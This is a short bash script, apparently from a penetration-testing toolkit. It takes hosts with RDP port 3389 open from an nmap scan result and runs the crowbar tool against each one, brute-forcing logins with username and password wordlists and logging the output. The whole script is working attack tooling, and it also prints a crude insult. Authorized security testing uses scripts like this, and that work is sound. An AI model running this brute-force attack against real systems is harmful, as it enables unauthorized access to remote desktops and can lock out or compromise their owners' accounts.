#!/usr/bin/env bash

source meuk/globalmeuk.sh

scanfile=${1:-}

echo "[.] Incompentent bastard "

if [ -z "$scanfile" ]; then
  echo "[!] Please provide the name of the nmap file"
  echo "[!] You failed..."
  exit;
fi

result=$(sh -c "./search.sh ${scanfile} 3389")

for xhost in $result; do
  echo "[+] RDP on ${xhost}"
  crowbar -b rdp -s ${xhost}/32 -u /meuk/wordlists/users.txt -C meuk/wordlists/passwords.txt -l meuk/logs/crowbar_vpn_${DATUM}.log

done